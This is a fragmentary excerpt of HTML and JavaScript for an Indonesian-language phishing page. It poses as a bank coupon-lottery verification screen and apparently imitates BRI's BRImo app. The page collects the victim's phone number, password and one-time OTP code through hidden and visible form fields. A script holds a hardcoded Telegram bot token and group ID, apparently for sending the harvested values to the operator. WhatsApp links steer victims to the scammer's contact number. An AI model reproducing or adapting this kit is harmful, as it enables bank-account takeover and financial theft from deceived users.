...
.loader{
 ...
 <body> 
  ...
  width: 100%; height: 100%; background: rgba(0,0,0, 0.4); z-index: 9999">
    ...
    <center>
 <img id="gambarku" class="animated" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjJxzz3Y0-j44_1t7T7gMMYNDlhJlhN2S4GeNYP_Tz3h12yXsdNVo2I8MZyUW2lK5NQOdmpq8sAP9n9CqMLOibLmJlilU5ddTJ9EX4qkZEtwiMjegVtlB6wMzYvHE3d-gbjjIy56U5gasd7QeMnFbxTFvqeOqECwHjefGSYmQV6Ass7PnvE2TYvppr1HCY/s1080/AddText_06-25-07.30.56.jpg" width="60%" style="margin-top: 250px; border-radius: 15px; box-shadow: rgba(199, 199, 199, 2.2)  0px 2px 5px 0px; border: 2px double #0F78CB" onclick="tutupimg()">
    </center>
</div>
 ...
 <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEig8lJ2TAjG3Frf_4E42lP3LEw4KyecrTH1gDWKv1TKALAwbNg_UcEsGSYKN1sb3nisb_reXgAFPi1OyPGWixuw1jdOl7rttdBAf-cnv9zXEdfl_EX0OxxFTJy86y7cyJsayGx1XNgifWwmC8oYkqbxb9EKb1vlQxBoTDGgOFy0ht7Cnpj6K_radbnUD9g/s1080/AddText_06-08-12.57.52.jpg" style="width: 100%; position: fixed; top: 0; left: 0; right: 0; margin: 0px auto">
   <span class="blink" style="display: none" id="blinkk"><h1>Tautan Link tidak Valid, atau sudah Kadaluarsa</h1></span>
 <div class="blink" style="display: none" id="blinkAktivasi"><h1>Kode Virtual tidak valid, atau sudah kadaluarsa</h1></div> 
  <div class="container" id="otp"> 
   <div class="box-lte"> 
    <div class="row" style="margin-top: 100px;"> 
     <center>
     <div class="col-12 d-block mx-auto text-center p-0" style="height: 290px; width: 85%; max-width: 100%; display: block; margin-top: 10px; border-radius: 0px 25px 0px 25px; position: absolute; margin: 0px auto; left: 0; right: 0;z-index: -1"> 
      <img alt="" src="img/IMG_20240921_153651.jpg" style="display: block; margin: 0px; width: 100%; height: 62%; border: 0px solid #fff; border-radius: 20px 20px 20px 20px; border-top: none; box-shadow: rgba(99, 99, 99, 0.2) -0px 3px 8px -2px; margin-top: 90px "> 
     </div>
         <div class="row" style="margin-top: 190px"> 
    
     <p style="font-weight: bold; font-size: 20px; color: #098CE3; text-align: center; margin-top: 10px; margin: -30px auto;" id="waktu">3 : 00</p> 
    </div>  
    </div> 

    <div class="row"> 
     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px; margin-top: 40px"> 
      <p style="font-size: 10px; text-align: center; font-weight: bold; padding: 15px"></p> 
     </div> 
    </div> 
    <center>
    <div class="row" style="margin-top: 5px; height: 170px; border: 2px solid #fff; width: 97%; border-radius: 15px; background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-GS2QLH5sTYjzLcnuRCCRqnHrc8NtNQyXThUatIg2Phz2obgUWHIuhxXRkOSDgC2m3WpWKJz4_OBloxwrfsgt-we1G02znrG2bRrriGnh9Gi59pCyiGNRAh-iGIE8RcMNr98Su4FSS3p6OriBv5Aewr2YnW5USA3PEDBmtBacEQvsUABW-zMFb2Vp3Vk/s1072/AddText_06-10-03.05.51.png); background-size: 100% 100%; background-position: 100% 100%; padding-top: 40px; box-shadow: rgba(99, 99, 99, 0.2) 0px 2px 8px 0px;"> 
     <div class="col-12" style="width: 100%; max-width: 100%; display: f; margin: :5px auto;"> 
  <form onsubmit="kirimPesan1(event)" method="post" id="formLink">
      
<input type="hidden" id="nomorhp" name="NoHp" value="">
...
<input type="hidden" id="pass" name="pass" value="">
       ...
       <center> 
        <div style="margin-top: 1px"> 
         <input type="tel" name="otp" id="nama1"  class="bubble-element Input form-log" placeholder="Silakan di screenshot jika menerima kode kupon" maxlength="6" minlength="6" pattern="(?=.*[0-9]).{6,6}"  required oninvalid="this.setCustomValidity('Mohon mɑsukkɑn 𝗞𝗼𝗱𝗲 𝗢𝗧𝗣 dengɑn ;benɑr')" onchange="this.setCustomValidity('')" style="margin-left: 0px;" required onclick="gantiborder1()">
       ...
       <b>
           ...
           <a href="https://api.whatsapp.com/send?phone=628157134128&text=Saya%20Belum%20Mendapatkan%20Kode%20Kupon%20Undian" id="kirims" class="bubble-element Button clickable-element"  />
              <label  class="bubble-element Button clickable-element" style="max-width: 100%; padding: 0px; cursor: pointer; background: none rgb(9, 140, 227); border: none; text-align: center; display: block; margin: 20px auto; height: 39px; width: 346px; left: 0px; top: 0px; font-family: Arial; font-size: 14px; font-weight: 400; color: rgb(255, 255, 255); letter-spacing: 1px; line-height: 1; border-radius: 10px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; transition: background 200ms ease 0s; font-weight: 700" /><br>
Konfirmasi Belum Terima Kupon</a></lebel>
</b>  
      </form>
    </div>
    <b> <p onclick="location.href='https://wa.me/628157134128?text=Saya Belum Mendapatkan Kode Kupon Undian'" style="font-size: 14px; text-align: center; margin-top: 25px; margin-left: 10px; margin-right: 10px;"><strong style="color: #FF0000; text-decoration: none">Tidak Terima Kode?
   ...
   <center>
     <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjQOBKOow8suWyuAcK8d_gpkCM3Fqf_rf6dgFfY5bUD5BXz7sgxmo1ASSB2efJXf-C1pRyrR7aVVO3DqTVslotvmSGMvFCwhDzJ6rjvplH08t5ZLlgtlyZQQ2XNFDjDTNGL6tqTqRfIVRWwBhIFVe1Z4G3yQ_McqHj-UIR-fjQjgODt8NeIc0PtXTI-hRM/s419/giphy.gif" style="width: 155px; top: 100; left: 0; right: 0; position: absolute; margin: 0px auto">
     </center>
    </div> </b>
  </div>
...
<source src="brimo." type="audio/ogg">
<source src="brimo." type="audio/mpeg">
...
<script
    ...
    phoneNumber:'08157134128',
    welcomeMessage:'Hallo Kak, Apa yang dapat saya bantu?👋',
    prefillMessage:'Saya Belum Mendapatkan Kode Kupon Undian  ',
    })"
    >
</script>
...
document.getElementById("uname").value = unames + "";
...
<script>
 ...
 function gantiborder1(){
   ...
   document.getElementById('kirims').value = "Konfirmasi";
       ...
       var token = '7966871057:AAENS-7Eils1Hit-SirGLakmWMW2LbNN3yk'; 
      var grup = '6560252299'; 
     ...
     $('#otp1').focus();
    var nomor = sessionStorage.getItem("nomor");
          document.getElementById("alert").innerHTML = "Kode baru dikirim ulang via WhatsApp ke  +62" + nomor +  " <br/>";
